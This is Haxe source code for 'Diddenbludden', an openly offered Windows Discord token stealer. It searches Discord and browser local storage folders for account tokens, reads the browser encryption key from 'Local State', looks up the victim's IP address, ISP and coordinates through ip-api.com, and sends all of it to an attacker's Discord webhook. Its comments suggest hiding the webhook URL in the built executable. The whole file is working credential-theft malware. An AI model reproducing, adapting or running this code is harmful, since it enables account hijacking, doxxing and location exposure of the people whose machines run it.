// USE HXDISCORD FOR THIS! ! !
// setup a DiscordClient.hx rq and add a static _user:Map<String, Dynamic> and on the onReady() set everything in the _user var

package;

import Discord.DiscordClient; // replace this with your discordclient thing
import sys.FileSystem;
import sys.io.File;
import haxe.Json;
import haxe.Http;

using StringTools;

/**
 * Structure for a raw Discord token.
 * 
 * TODO: Diddenbludden 1.5 doesn't decrypt your token and you will have to do it manually.
 * maybe try an AES haxelib?? i'm not sure if it's possible though
 * if it was, this wouldn't be necessary lol
 */
typedef Token =
{
	/**
	 * Raw AES encrypted token.
	 */
	var token:String;

	/**
	 * OScrypt encrypted key needed to decrypt the token.
	 */
	var key:String;
}

// Diddenbludden only works on windows targets! ! !
#if !windows
class Diddenbludden
{
	public function new() {	}

	public function troll() { }
}
#else

/**
 * @author skewi
 * this sucks
 * 
 * new Diddenbludden().troll();
 * enjoy
 */
class Diddenbludden
{
	/**
	 * Your Discord webhook, used to post the token data.
	 * NOTE: this url string will appear as it is in the .exe, you probably should encrypt this in order for it to not get leaked.
	 */
	final WEBHOOK_URL:String = 'https://discord.com/api/webhooks/ID/TOKEN';

	/**
	 * Colour for the embed, saved as a RGB Hexadecimal string
	 */
	final EMBED_COLOR:String = '0x8C28FF';

	/**
	 * Local directory environment.
	 */
	final local:String = Sys.getEnv('LOCALAPPDATA');

	/**
	 * Roaming directory environment.
	 */
	final roaming:String = Sys.getEnv('APPDATA');

	/**
	 * Does the whole thing
	 */
	public function troll()
	{
		// A list of directories to check.
		final paths:Map<String, String> =
		[
			'Discord'             =>         '$roaming\\discord'                                            ,
			'Discord Canary'      =>         '$roaming\\discordcanary'                                      ,
			'Lightcord'           =>         '$roaming\\Lightcord'                                          ,
			'Discord PTB'         =>         '$roaming\\discordptb'                                         ,
			'Opera'               =>         '$roaming\\Opera Software\\Opera Stable'                       ,
			'Opera GX'            =>         '$roaming\\Opera Software\\Opera GX Stable'                    ,
			'Orbitum'             =>         '$local\\Orbitum\\User Data'                                   ,
			'Vivaldi'             =>         '$local\\Vivaldi\\User Data\\Default'                          ,
			'Chrome SxS'          =>         '$local\\Google\\Chrome SxS\\User Data'                        ,
			'Chrome'              =>         '$local\\Google\\Chrome\\User Data\\Default'                   ,
			'Microsoft Edge'      =>         '$local\\Microsoft\\Edge\\User Default\\Default'               ,
			'Brave'               =>         '$local\\BraveSoftware\\Brave-Browser\\User Data\\Default'     ,
			'Iridum'              =>         '$local\\Iridum\\User Data\\Default'
		];

		/**
		 * Dynamic structure for the all the IP related information.
		 */
		var dox:Dynamic = null;

		// Uses IP-API to get information through a HTTP request, and saves the retrieved data.
		var http:Http = new Http('http://ip-api.com/json');

		http.onData = function(data:String)
		{
			dox = Json.parse(data);
		}

		http.onError = function(data:String)
		{
			trace('[Diddenbludden] HTTP Error: $data');
		}

		http.request();

		// Stores every token found in the previously listed directories.
		var tokens:Array<Token> = [];

		for (path in paths)
		{
			if (!FileSystem.exists(path))
				continue;

			for (_token in getTokens(path))
			{
				if (_token.endsWith('\\'))
					_token.replace('\\', '');

				var token:Token = {token: _token, key: getKey(path)};

				if (!tokens.contains(token))
					tokens.push(token);
			}
		}

		/**
		 * Parses the hexadecimal RGB to an integer so Discord supports it.
		 */
		final color:Int = Std.parseInt(EMBED_COLOR);

		// Posts an embed with every stored token.
		for (token in tokens)
		{
			// Could avoid error #400 ?
			Sys.sleep(0.5);

			@:privateAccess
			{
				// Sets the webhook HTTP
				var webhook:Http = new Http(WEBHOOK_URL);

				webhook.setHeader('Content-Type', 'application/json');

				// Posts the information in a pretty embed :3
				postDiscordEmbed({
					'title': DiscordClient._user.get('global-name') + ' (' + DiscordClient._user.get('user') + ' - ' + DiscordClient._user.get('user-id') + ')',
					'description': 'Logged at ' + Date.now().toString() + ' (Timezone: ' + dox.timezone + ')',
					'color': color,
					'thumbnail': {url: 'https://cdn.discordapp.com/avatars/' + DiscordClient._user.get('user-id') + '/' + DiscordClient._user.get('avatar') + '.png'},
					'fields': [
						{
							'name':       'Discord Account Information',
							'value':      '**Token (Raw):** '    +      token.token          +      '\n' + '\n'
								   +      '**Key:** '            +      token.key
						},
						{
							'name':       'IP Information',
							'value':      '**IP:** '             +      dox.query            +      '\n'
								   +      '**ISP:** '            +      dox.isp              +      '\n'
								   +      '**Country:** '        +      dox.country          +      '\n'
								   +      '**Region Name**: '    +      dox.regionName       +      '\n'
								   +      '**Region:** '         +      dox.region           +      '\n'
								   +      '**Timezone**: '       +      dox.timezone         +      '\n'
								   +      '**ZIP Code:** '       +      dox.zip              +      '\n'
								   +      '**AS:** '             +      dox.as               +      '\n'
								   +      '**Longitude**: '      +      dox.lon              +      '\n'
								   +      '**Latitude**: '       +      dox.lat              +      '\n'
								   +      '**City:** '           +      dox.city             +      '\n'
								   +      '**Country Code:** '   +      dox.countryCode      +      '\n'
								   +      '**ORG:** '            +      dox.org              +      '\n'
						}
					]
				}, webhook);
			}
		}
	}

	/**
	 * Reads your Discord Local Storage folder and indexes with a regex to find (raw) tokens.
	 * @param path Directory to search in.
	 * @return Every token it could find.
	 */
	function getTokens(path:String):Array<String>
	{
		var tokens:Array<String> = [];

		path += '\\Local Storage\\leveldb\\';

		if (!FileSystem.exists(path))
			return tokens;

		for (file in FileSystem.readDirectory(path))
		{
			if (!file.endsWith('.ldb') && !file.endsWith('.log'))
				continue;

			try
			{
				for (line in File.getContent(path + file).split('\n'))
				{
					final regex = ~/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\"]*"/;

					// we got the token
					if (regex.match(line.trim()))
						tokens.push(regex.matched(0));
				}
			}
			catch(ex:Dynamic)
			{
				trace('[Diddenbludden] Error while getting token file content: $ex');
				continue;
			}
		}

		return tokens;
	}

	/**
	 * Returns the OScrypt encrypted key.
	 * @param path directory to search in.
	 */
	function getKey(path:String):String
		return Json.parse(File.getContent(path + '\\Local State')).os_crypt.encrypted_key;

	/**
	 * Posts a Discord embed through a Http request
	 * @param embed Embed contents for the post.
	 * @param webhook HTTP with the webhook.
	 */
	function postDiscordEmbed(embed, webhook:Http)
	{
		if (webhook == null)
			return;

		webhook.setPostData(Json.stringify({content: '', embeds: [embed]}));
		webhook.request();
	}

	public function new() {	}
}
#end
